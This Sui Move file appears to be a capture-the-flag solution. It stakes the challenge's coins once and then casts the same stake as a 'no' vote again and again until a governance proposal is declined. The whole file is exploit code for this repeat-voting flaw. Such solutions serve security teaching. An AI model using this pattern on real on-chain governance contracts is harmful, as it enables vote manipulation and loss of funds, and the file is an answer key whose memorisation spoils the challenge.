module the_solution::solution;

use challenge::challenge::{Challenge, GET_PROPOSAL_INDEX_TO_DECLINE};
use challenge::coin::COIN;
use challenge::governance::no_votes;

public fun solve(challenge: &mut Challenge<COIN>, ctx: &mut TxContext) {
    let coins = challenge.claim_coin(ctx);

    let governance = challenge.get_governance();
    assert!(governance.get_proposal(GET_PROPOSAL_INDEX_TO_DECLINE()).is_open());

    let stake_amount = coins.value();
    governance.stake(coins, ctx);

    let mut balance_for_decline = governance.get_balance() / 2 + 1;
    let no_votes = governance.get_proposal(GET_PROPOSAL_INDEX_TO_DECLINE()).no_votes();
    if (no_votes < balance_for_decline) {
        balance_for_decline = balance_for_decline - no_votes;

        let mut voted_balance = 0;

        while (voted_balance < balance_for_decline) {
            governance.vote(GET_PROPOSAL_INDEX_TO_DECLINE(), false, ctx);
            voted_balance = voted_balance + stake_amount;
        }
    };
    assert!(!governance.get_proposal(GET_PROPOSAL_INDEX_TO_DECLINE()).is_open());
}
